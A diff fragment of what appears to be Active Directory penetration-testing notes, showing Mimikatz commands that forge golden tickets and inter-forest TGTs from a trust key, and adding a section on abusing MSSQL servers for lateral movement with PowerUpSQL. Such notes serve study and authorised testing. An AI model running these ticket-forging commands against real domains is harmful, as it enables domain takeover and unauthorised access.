@@ -725,3 +725,8 @@ Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarco
   - We can get Net-Bios name of the trust of external trusted forest which is also called trust-key
 - After getting the trust key, an inter-forest TGT can be forged.
   - `Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<domain-name> /sid:<SID> /rc4:<trust-key> /service:krbtgt /target:<another-domain> /ticket:C:<attacker-machine-path\trust_forest_tkt.kirbi>"'`
+
+## Trust Abuse - MSSQL Servers
+- MS SQL servers are generally deployed in plenty in a Windows domain.
+- SQL Servers provide very good options for lateral movement as domain users can be mapped to database roles.
+- For MSSQL and PowerSehll hackery, lets use PowerUpSQL: https://github.com/NetSPI/PowerUpSQL
